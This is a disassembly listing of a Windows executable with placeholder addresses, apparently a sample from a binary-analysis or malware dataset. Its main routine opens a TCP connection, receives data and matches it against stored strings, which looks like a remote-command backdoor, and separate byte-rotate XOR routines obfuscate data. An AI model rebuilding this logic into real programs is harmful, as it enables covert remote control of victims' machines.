or eax 0xffffffff
jmp r-xdata
lea eax [ esi + 0x660 ]
push eax
push [ ebp - 0x4 ]
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x54 ] eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
lea eax [ esi + 0xa0a ]
push eax
push [ ebp - 0x4 ]
call [ esi + 0x4ac ]
cmp eax ebx
mov [ ebp - 0x10 ] eax
je r-xdata
mov eax [ esi + 0xaae ]
cmp eax ebx
mov [ ebp - 0x38 ] eax
je r-xdata
xor eax eax
lea edi [ ebp - 0x97 ]
mov [ ebp - 0x98 ] bl
mov [ ebp - 0x74 ] bl
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
xor eax eax
lea edi [ ebp - 0x73 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x1f
xor eax eax
pop ecx
lea edi [ ebp - 0x117 ]
mov [ ebp - 0x118 ] bl
mov [ ebp - 0x3c ] 0x1
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x74 ]
mov [ ebp - 0x14 ] ebx
push eax
lea eax [ ebp - 0x98 ]
push eax
lea eax [ esi + 0x40 ]
push eax
lea eax [ esi + 0x370 ]
push eax
call [ ebp - 0x50 ]
add esp 0x10
lea eax [ ebp - 0x98 ]
mov [ ebp - 0x84 ] 0x2
push eax
call [ ebp - 0x24 ]
cmp eax 0xf
jg r-xdata
lea eax [ ebp - 0x98 ]
push eax
call [ ebp - 0x5c ]
mov [ ebp - 0x80 ] eax
lea eax [ ebp - 0x74 ]
push eax
call [ ebp - 0xc ]
test eax eax
pop ecx
jle r-xdata
lea eax [ ebp - 0x74 ]
push eax
call [ ebp - 0xc ]
cmp eax 0xffff
pop ecx
jge r-xdata
lea eax [ ebp - 0x74 ]
push eax
call [ ebp - 0xc ]
pop ecx
push eax
call [ ebp - 0x2c ]
mov [ ebp - 0x82 ] ax
lea eax [ ebp - 0x3ac ]
push eax
push 0x202
call [ ebp - 0x60 ]
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push 0x6
push 0x1
push 0x2
call [ ebp - 0x34 ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
lea eax [ ebp - 0x84 ]
push 0x10
push eax
push edi
call [ ebp - 0x58 ]
cmp eax 0xffffffff
je r-xdata
push eax
call [ ebp - 0x8 ]
jmp r-xdata
push 0x2
push edi
call [ ebp - 0x40 ]
push edi
call [ ebp - 0x8 ]
call [ ebp - 0x18 ]
push [ ebp + 0x8 ]
add esi 0x4b0
call [ esi ]
push [ ebp - 0x4 ]
call [ esi ]
push [ ebp - 0x48 ]
call [ esi ]
lea eax [ ebp - 0x3c ]
push eax
push 0x8004667e
push edi
call [ ebp - 0x1c ]
cmp eax 0xffffffff
jne r-xdata
call [ ebp - 0x18 ]
mov eax ebx
jmp r-xdata
lea eax [ esi + 0x14 ]
push ebx
push 0x14
push eax
push edi
call [ ebp - 0x44 ]
cmp eax 0xffffffff
je r-xdata
push edi
call [ ebp - 0x8 ]
push 0x1
pop ebx
lea eax [ ebp - 0x118 ]
push 0x80
push eax
mov [ ebp - 0x218 ] edi
mov [ ebp - 0x21c ] 0x1
call [ ebp - 0x54 ]
push ebx
push ebx
lea eax [ ebp - 0x21c ]
push ebx
push eax
push ebx
call [ ebp - 0x4c ]
cmp eax 0xffffffff
je r-xdata
lea eax [ ebp - 0x21c ]
push eax
push edi
call [ ebp - 0x20 ]
test eax eax
je r-xdata
cmp [ ebp - 0x14 ] ebx
je r-xdata
push ebx
lea eax [ ebp - 0x118 ]
push 0x7f
push eax
push edi
call [ ebp - 0x28 ]
cmp eax 0xffffffff
je r-xdata
lea eax [ esi + 0x14 ]
push 0x10
push eax
lea eax [ ebp - 0x118 ]
push eax
call [ ebp - 0x30 ]
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi + 0xa6a ]
push eax
lea eax [ ebp - 0x118 ]
push eax
call [ ebp - 0x10 ]
test eax eax
jne r-xdata
lea eax [ esi + 0xa7a ]
push eax
lea eax [ ebp - 0x118 ]
push eax
call [ ebp - 0x10 ]
test eax eax
jne r-xdata
push edi
push esi
call [ ebp - 0x38 ]
jmp r-xdata
mov [ ebp - 0x14 ] 0x1
sub_403608
push esi
mov esi [ esp + 0x8 ]
push edi
push 0x1
mov al [ esi ]
pop edi
mov cl al
shl cl 0x3
shr al 0x5
or cl al
xor cl [ esp + 0x10 ]
cmp [ esp + 0x14 ] edi
mov [ esi ] cl
jbe r-xdata
pop edi
pop esi
retn 0xc
mov dl [ edi + esi ]
lea eax [ edi + esi ]
mov cl dl
shl cl 0x3
shr dl 0x5
or cl dl
mov [ eax ] cl
mov dl [ edi + esi - 0x1 ]
xor dl cl
inc edi
cmp edi [ esp + 0x14 ]
mov [ eax ] dl
jb r-xdata
sub_40364f
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0x8 ]
lea ecx [ eax - 0x1 ]
test ecx ecx
jbe r-xdata
mov al [ esi ]
xor al [ esp + 0xc ]
mov cl al
shr cl 0x3
shl al 0x5
or cl al
mov [ esi ] cl
pop esi
retn 0xc
mov al [ ecx + esi - 0x1 ]
xor al [ ecx + esi ]
mov dl al
shr dl 0x3
shl al 0x5
or dl al
mov [ ecx + esi ] dl
dec ecx
jne r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_401003
cmp [ rw-data ] ebx
jne r-xdata
call sub_403894
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_4038a6
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_4017e0
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_401000
mov eax ecx
retn
sub_401003
retn
sub_4015d6
mov eax ecx
and [ eax ] 0x0
and [ eax + 0x4 ] 0x0
retn
sub_4015e0
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
retn
push 0x0
call free
pop ecx
sub_401647
push esi
mov esi ecx
cmp [ esi ] 0x0
jne r-xdata
pop esi
retn
push rw-data
push rw-data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ esi ] eax
sub_40178c
call sub_401796
jmp sub_4017a0
sub_401796
mov ecx rw-data
jmp sub_401000
sub_4017a0
push sub_4017ac
call sub_403712
pop ecx
retn
sub_4017ac
mov ecx rw-data
jmp sub_401003
sub_4017b6
call sub_4017c0
jmp sub_4017ca
sub_4017c0
mov ecx rw-data
jmp sub_401000
sub_4017ca
push sub_4017d6
call sub_403712
pop ecx
retn
sub_4017d6
mov ecx rw-data
jmp sub_401003
sub_402640
push [ rw-data ]
call free
pop ecx
retn
fclose
jmp [ fclose@IAT ]
fseek
jmp [ fseek@IAT ]
sprintf
jmp [ sprintf@IAT ]
fopen
jmp [ fopen@IAT ]
strcpy
jmp [ strcpy@IAT ]
memset
jmp [ memset@IAT ]
fread
jmp [ fread@IAT ]
memcpy
jmp [ memcpy@IAT ]
free
jmp [ free@IAT ]
realloc
jmp [ realloc@IAT ]
malloc
jmp [ malloc@IAT ]
strlen
jmp [ strlen@IAT ]
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
??2@YAPAXI@Z
jmp [ operator new@IAT ]
_except_handler3
jmp [ _except_handler3@IAT ]
sub_4036e6
cmp [ rw-data ] 0xffffffff
jne r-xdata
push rw-data
push rw-data
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_403712
push [ esp + 0x4 ]
call sub_4036e6
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
__dllonexit
jmp [ __dllonexit@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_403894
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_4038a6
xor eax eax
retn
_controlfp
jmp [ _controlfp@IAT ]
_wcsnicmp
jmp [ _wcsnicmp@IAT ]
